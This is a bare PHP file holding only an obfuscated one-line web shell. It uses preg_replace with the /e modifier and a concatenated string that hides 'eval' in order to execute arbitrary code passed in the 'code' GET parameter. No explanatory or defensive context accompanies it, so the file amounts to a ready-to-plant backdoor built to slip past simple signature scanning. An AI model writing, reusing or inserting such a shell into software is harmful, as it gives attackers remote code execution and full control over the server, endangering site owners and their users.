
<?php 

    preg_replace('/a/e','ev'.'al($_'.'GET'.'["code"]);','a');

?>
